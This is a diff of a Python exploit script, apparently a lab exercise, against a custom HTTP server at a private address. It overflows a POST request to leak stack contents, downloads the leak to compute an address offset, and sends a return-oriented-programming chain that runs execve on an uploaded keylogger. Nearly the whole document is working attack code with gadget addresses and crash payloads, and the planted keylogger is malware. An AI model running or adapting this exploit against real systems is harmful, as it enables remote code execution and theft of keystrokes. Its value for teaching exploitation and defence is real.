@@ -1,23 +1,21 @@
 '''
 [FINDINGS]
-General flow:
-1) Sent request
-2) handle_client: Receives the whole request and sends the response back to the client using its file descriptor after rest of processing
-3) parse_request: Parses the request in arg:request_buf, logs only (!!) the request header, receives any remaining body data, 
-                  executes the request, and builds a response in arg:response_buf
-4) log_message: Logs arg:message to stdout and to a file
-
-In the handle_client function a space of 0x500018 is allocated on the stack in comparison to 0x518 in scenario 1.
-So we have space for approx 5114 KB instead of the previous 1 KB which offers us enough space to also store the keylogger.
-This space is mostly used for the request_buffer of parse_request which is 0x4fffff big.
-
-Next the goal is the same as in scenario 1, crash the server so N = 1 again and next sent the payload to run the keylogger,
-but now we also need to sent the keylogger first and execute this keylogger which is now located on the stack in the space
-from previous alinea.
-
-To do this we don't put the keylogger inside the stack frame of log_message but just append it to the payload
-after the spot to place the return address to the shellcode and reference the start of the keylogger
-in that shell code. Now we just execute this binary which is now located on the stack.
+Exploit in POST, writes the given data but also everything higher then then adresses on the stack
+Example stack:
+              handle_client_frame
+                |
+                <===========================================> 
+                <return><======================0x530========>
+                    |                    <===POST-PAYLOAD===>
+                    |
+                    |
+                    └> <...rbp,rbx,RAX,RET,rbp,r15,r14,r12,rbx> ---> zie demo.txt
+         
+    
+Looking at handle_client, the 6th address which we push on the stack is the rbp of handle_client
+Find address using that data
+Use that address to calculate the offset to the adres space of scenario_2
+Use that offset to calculate the offset of the ropchain
 '''
 
 from keystone import *
@@ -27,32 +25,44 @@ from struct import pack
 ### CONFIGS ###
 host = "192.168.152.130"
 port = 8080 
-og_buffer_address = 0x7ffff75cf2d1
+og_handle_address = 0x3720
+return_address_offset = 183
 log_buffer_rbp_offset = 0x450 # the log buffer starts at $original_rbp-0x450
 log_buffer_prefix = 49 # the server already adds 49 bytes at start of the log buffer
 
 ### FUNCTIONS ###
-def get_buffer_address():
+def get_handle_address():
     with open('./scenario_4/data.txt', 'rb') as f:
         stack_data = f.read()
 
-    # Function to check if a value is likely a valid address (e.g., in the range of typical stack addresses)
-    def is_valid_address(address):
-        # For a 64-bit system, typical stack addresses start with 0x7f or 0x7e
-        return address >= 0x7e0000000000 and address <= 0x7fffffffffff
+    # Translate file data to hex in chuncks of 8 bytes
+    hex_pairs = [f'{x:02x}' for x in stack_data]
+    hex_segments = []
+    for i in range(0, len(hex_pairs), 8):
+        segment = hex_pairs[i:i+8][::-1]  
+        hex_segments.append(''.join(segment)) 
+    
+    hex_data = ' '.join(hex_segments)
 
-    # Extract potential addresses from the stack data
-    def extract_addresses(data):
-        for i in range(0, len(data) - 8 + 1, 8):  # Assuming 8-byte (64-bit) addresses
-            chunk = data[i:i+8]
-            if len(chunk) == 8:
-                address = struct.unpack('<Q', chunk)[0]  # Unpack as little-endian 64-bit unsigned long
-                if is_valid_address(address):
-                    return address
+    # Write to file
+    with open('./scenario_4/out.txt', 'w') as f:
+        f.write(hex_data)
 
-    # Extract and print the addresses
-    address = extract_addresses(stack_data)
-    print(hex(address))
+    # Find the address of the handle function
+    return int(hex_data.split(' ')[return_address_offset], 16)
+
+def download_data_file():
+    url = f"http://{host}:{port}/data.txt"
+    local_path = './scenario_4/data.txt'
+
+    try:
+        # Download the file using wget
+        wget(url, local_path)
+
+        print(f"File downloaded successfully to {local_path}")
+
+    except Exception as e:
+        print(f"Failed to download file. Error: {e}")
 
 ### PAYLOAD ###
 message_prefix = b"GET /data.txt HTTP/1.1\r\n"
@@ -66,42 +76,41 @@ crash += 0xffffffffffffffff.to_bytes(8, "little") # add new little endian return
 crash += b"\r\n\r\n"
 
 ### CREATE THE POST PAYLOAD ###
-text = b"AAAAAAAA"
+text = b"AAAAAAAABCCCCCCC"
 post_exploit = b"POST /data.txt HTTP/1.1\r\n"
 post_exploit += b"Content-Length: 100000 \r\n"
 post_exploit += b"\r\n"  
 post_exploit += text
 
 ### CREATE THE ROPCHAIN ATTACK  ###
-
-def create_ropchain_attack(buffer_address):
-    offset = og_buffer_address - buffer_address
+def create_ropchain_attack(handle_address):
+    offset = og_handle_address - handle_address
     keylogger_name = b'./keylog'
 
     p = b''
-    p += pack('<Q', 0x00000000004036da - offset) # pop rdx ; pop rax ; ret  
-    p += pack('<Q', 0x0000000000406230 - offset) # @ .data
+    p += pack('<Q', 0x000000000000375a - offset) # pop rdx ; pop rax ; ret
+    p += pack('<Q', 0x0000000000006230 - offset) # @ .data
     p += pack('<Q', 0x4141414141414141) # padding
-    p += pack('<Q', 0x00000000004036db - offset) # pop rax ; ret
+    p += pack('<Q', 0x000000000000375b - offset) # pop rax ; ret
     p += keylogger_name
-    p += pack('<Q', 0x00000000004036d6 - offset) # mov qword ptr [rdx], rax ; ret
-    p += pack('<Q', 0x00000000004036da - offset) # pop rdx ; pop rax ; ret  
-    p += pack('<Q', 0x0000000000406238 - offset) # @ .data + 8
+    p += pack('<Q', 0x0000000000003756 - offset) # mov qword ptr [rdx], rax ; ret
+    p += pack('<Q', 0x000000000000375a - offset) # pop rdx ; pop rax ; ret
+    p += pack('<Q', 0x0000000000006238 - offset) # @ .data + 8
     p += pack('<Q', 0x4141414141414141) # padding
-    p += pack('<Q', 0x00000000004036dd - offset) # xor rax, rax ; ret       
-    p += pack('<Q', 0x00000000004036d6 - offset) # mov qword ptr [rdx], rax ; ret
-    p += pack('<Q', 0x000000000040398b - offset) # pop rdi ; ret
-    p += pack('<Q', 0x0000000000406230 - offset) # @ .data
-    p += pack('<Q', 0x00000000004028ac - offset) # pop rsi ; pop rbp ; ret  
-    p += pack('<Q', 0x0000000000406238 - offset) # @ .data + 8
+    p += pack('<Q', 0x000000000000375d - offset) # xor rax, rax ; ret
+    p += pack('<Q', 0x0000000000003756 - offset) # mov qword ptr [rdx], rax ; ret
+    p += pack('<Q', 0x0000000000003a1b - offset) # pop rdi ; ret
+    p += pack('<Q', 0x0000000000006230 - offset) # @ .data
+    p += pack('<Q', 0x00000000000028bc - offset) # pop rsi ; pop rbp ; ret
+    p += pack('<Q', 0x0000000000006238 - offset) # @ .data + 8
     p += pack('<Q', 0x4141414141414141) # padding
-    p += pack('<Q', 0x00000000004036da - offset) # pop rdx ; pop rax ; ret  
-    p += pack('<Q', 0x0000000000406238 - offset) # @ .data + 8
+    p += pack('<Q', 0x000000000000375a - offset) # pop rdx ; pop rax ; ret
+    p += pack('<Q', 0x0000000000006238 - offset) # @ .data + 8
     p += pack('<Q', 0x4141414141414141) # padding
-    p += pack('<Q', 0x00000000004036dd - offset) # xor rax, rax ; ret       
-    p += pack('<Q', 0x00000000004036db - offset) # pop rax ; ret
-    p += pack("<Q", 0x000000000000003b - offset) # syscall number (59) for rax
-    p += pack("<Q", 0x00000000004036fb - offset) # syscall
+    p += pack('<Q', 0x000000000000375d - offset) # xor rax, rax ; ret
+    p += pack('<Q', 0x000000000000375b - offset) # pop rax ; ret
+    p += pack("<Q", 0x000000000000003b) # syscall number (59) for rax
+    p += pack("<Q", 0x000000000000377b - offset) # syscall
 
     rop_exploit = message_prefix
     padding_size = log_buffer_rbp_offset + 8 - log_buffer_prefix - message_prefix_len
@@ -113,15 +122,17 @@ def create_ropchain_attack(buffer_address):
 
 
 ### PERFORM ATTACK ###
-
 remote(host, port).send(post_exploit)
-# input("Download the data.txt file from the server and upload the keylogger. Press any key to continue...")
-# buffer_address = get_buffer_address()
-# rop_exploit = create_ropchain_attack(buffer_address)
-# remote(host, port).send(rop_exploit)
+sleep(3)
 
-# Read the stack data from the file
+download_data_file()
+handle_address = get_handle_address()
+print("Handle address found : " + hex(handle_address))
+rop_exploit = create_ropchain_attack(handle_address)
 
+input("Upload the keylogger. Press any key to continue...")
+
+remote(host, port).send(rop_exploit)
 
 
 
@@ -148,3 +159,4 @@ remote(host, port).send(post_exploit)
 #   <6>: injected payload
 #   <7>: "GET /data.txt HTTP/1.1\r\n"
 #   <8>: "== Request from..."
+
